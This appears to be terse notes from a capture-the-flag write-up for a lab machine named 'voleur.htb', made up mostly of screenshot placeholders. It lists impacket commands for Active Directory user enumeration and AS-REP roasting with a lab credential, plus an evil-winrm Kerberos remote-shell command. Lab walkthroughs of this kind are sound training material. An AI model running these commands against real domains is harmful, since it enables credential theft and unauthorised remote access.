



impacket-GetADUsers -all -dc-ip 10.10.11.76 voleur.htb/ryan.naylor:HollowOct31Nyt -dc-host dc.voleur.htb -k

![alt text](image.png)

impacket-GetNPUsers voleur.htb/ryan.naylor:HollowOct31Nyt -usersfile users.txt -dc-ip 10.10.11.76 -request -k

![alt text](image-1.png)

![alt text](image-2.png)

![alt text](image-3.png)

![alt text](image-7.png)

![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

![alt text](image-9.png)

มันไม่ -k แล้วไปอ่านใน klist จะอ่านจาก exportเท่านั้น

![alt text](image-11.png)

![alt text](image-10.png)

![alt text](image-12.png)

![alt text](image-13.png)

evil-winrm -i dc.voleur.htb -r voleur.htb

-r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
![alt text](image-15.png)

![alt text](image-14.png)